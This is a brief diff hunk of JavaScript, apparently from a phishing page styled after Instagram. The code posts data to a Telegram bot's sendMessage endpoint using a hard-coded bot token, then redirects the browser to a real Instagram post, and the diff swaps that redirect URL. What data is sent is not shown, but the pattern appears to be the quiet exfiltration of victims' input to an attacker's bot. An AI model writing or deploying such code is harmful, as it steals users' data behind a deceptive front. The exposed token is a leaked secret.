@@ -24,7 +24,7 @@ function httpGetAsync(url, callback) {
     xhr.onreadystatechange = function () {
         if (this.readyState != 4) return;
         if (l ===1 )
-            window.location.replace("https://www.instagram.com/p/CKcDTelB_vm/?utm_source=ig_web_copy_link")
+            window.location.replace("https://www.instagram.com/p/CLkLITCgidR/?igshid=ejgzwu53c2nj")
             
     };
     xhr.open("POST", "https://api.telegram.org/bot1316984210:AAEfAXhddoAH5DsTGqcmGE_FhOJoA1aruro/sendMessage", true);
